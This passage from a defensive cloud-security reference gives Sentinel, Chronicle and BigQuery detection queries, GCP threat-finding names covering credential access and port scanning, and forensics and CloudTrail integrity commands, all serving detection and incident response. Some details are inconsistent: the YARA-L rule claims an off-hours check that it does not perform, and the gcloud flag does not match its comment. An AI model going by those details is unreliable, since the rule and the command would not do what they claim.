| where TargetRole in ("Global Administrator", "Privileged Role Administrator",
    "Security Administrator", "Exchange Administrator", "Application Administrator")
| project TimeGenerated, TargetRole, AssignedTo, AssignedBy

// Sentinel: Impossible travel detection
SigninLogs
| where ResultType == 0
| project UserPrincipalName, IPAddress, Location, TimeGenerated
| join kind=inner (
    SigninLogs
    | where ResultType == 0
    | project UserPrincipalName, IPAddress2=IPAddress, Location2=Location, TimeGenerated2=TimeGenerated
) on UserPrincipalName
| where TimeGenerated2 > TimeGenerated
| where datetime_diff('minute', TimeGenerated2, TimeGenerated) < 60
| where Location != Location2
| where IPAddress != IPAddress2
| project UserPrincipalName, Location, Location2, TimeGenerated, TimeGenerated2
```

### GCP Threat Detection and Chronicle Integration

**Security Command Center Event Threat Detection**

```bash
# Enable Event Threat Detection (requires Security Command Center Premium)
gcloud scc settings update \
  --organization ORG_ID \
  --enable-asset-discovery

# Key Event Threat Detection findings:
# DEFENSE_EVASION_DISABLE_LOGGING - Audit log disabled
# INITIAL_ACCESS_BREACH_CANARY_TOKEN_ACCESSED - Honeypot token accessed
# PRIVILEGE_ESCALATION_ALLOYDB_ESCALATE_PRIVILEGES
# PERSISTENCE_NEW_API_KEY - New API key created
# CREDENTIAL_ACCESS_SECRETMANAGER_LARGE_READS
# DISCOVERY_SCAN_PORT_SCANNING
```

**BigQuery/Chronicle Detection Queries**

```sql
-- Chronicle YARA-L rule for unusual GCP API activity
rule gcp_unusual_admin_activity {
  meta:
    description = "Unusual GCP admin API activity outside business hours"
    severity = "MEDIUM"
  events:
    $e.metadata.event_type = "USER_RESOURCE_ACCESS"
    $e.target.resource.resource_type = "GCP_IAM_POLICY"
    $e.principal.user.userid != /.*@company\.com$/
    $e.metadata.event_timestamp.seconds > 0

  condition:
    $e
}

-- BigQuery: Service account key creation spike
SELECT TIMESTAMP_TRUNC(timestamp, HOUR) as hour,
       protopayload_auditlog.authenticationInfo.principalEmail as actor,
       COUNT(*) as key_creates
FROM `PROJECT.DATASET.cloudaudit_googleapis_com_activity`
WHERE protopayload_auditlog.methodName = "google.iam.admin.v1.CreateServiceAccountKey"
  AND timestamp > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 7 DAY)
GROUP BY 1, 2
HAVING key_creates > 3
ORDER BY key_creates DESC
```

### Cloud Forensics Reference

**Evidence Collection Priority**

| Priority | Evidence Type | Tool/Method |
|---|---|---|
| 1 | CloudTrail / audit logs | Preserve to immutable S3 with Object Lock |
| 2 | GuardDuty findings | Export via findings export or EventBridge |
| 3 | VPC Flow Logs | Download from CloudWatch/S3 |
| 4 | Memory capture | SSM Run Command + avml or LiME |
| 5 | Disk image | EBS snapshot → restore → dd |
| 6 | Network captures | VPC Traffic Mirroring or instance-level tcpdump |
| 7 | Application logs | CloudWatch Logs, S3 access logs |
| 8 | Container logs | kubectl logs, Falco alerts |

**CloudTrail Integrity Verification**

```bash
# Verify CloudTrail log file integrity
aws cloudtrail validate-logs \
  --trail-arn arn:aws:cloudtrail:us-east-1:ACCOUNT:trail/TRAIL_NAME \
  --start-time 2024-01-01T00:00:00Z \
  --end-time 2024-01-02T00:00:00Z

# Enable log file validation on existing trail
aws cloudtrail update-trail \
  --name TRAIL_NAME \
  --enable-log-file-validation

# Check if CloudTrail is enabled across all regions
aws cloudtrail describe-trails --include-shadow-trails \
  --query 'trailList[*].{Name:Name,MultiRegion:IsMultiRegionTrail,Validation:LogFileValidationEnabled}'
```

---

*Reference built for cloud security engineers and incident responders. All techniques documented for defensive understanding and detection engineering. Always obtain written authorization before testing cloud environments.*
